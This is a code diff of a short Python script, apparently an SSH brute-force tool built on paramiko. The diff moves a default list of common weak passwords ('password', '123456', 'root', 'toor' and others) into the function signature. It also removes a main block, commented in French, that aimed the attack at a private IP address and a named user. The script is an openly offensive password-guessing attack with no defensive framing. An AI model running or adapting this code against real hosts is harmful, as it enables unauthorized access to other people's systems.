@@ -1,7 +1,16 @@
 import paramiko
 import time
 
-def ssh_bruteforce(ip, port, username, password_list):
+
+def ssh_bruteforce(ip, port, username, password_list=[
+        'password',
+        '123456',
+        'admin',
+        'root',
+        'toor',
+        'letmein'
+    ]
+):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
@@ -20,21 +29,4 @@ def ssh_bruteforce(ip, port, username, password_list):
 
     return False
 
-if __name__ == '__main__':
-    target_ip = '192.168.1.19'  # Adresse IP cible
-    target_port = 22  # Port SSH
-    target_username = 'els'  # Nom d'utilisateur SSH
 
-    # Liste de mots de passe à tester
-    password_list = [
-        'password',
-        '123456',
-        'admin',
-        'root',
-        'toor',
-        'letmein'
-    ]
-
-    success = ssh_bruteforce(target_ip, target_port, target_username, password_list)
-    if not success:
-        print('Bruteforce attack failed.')
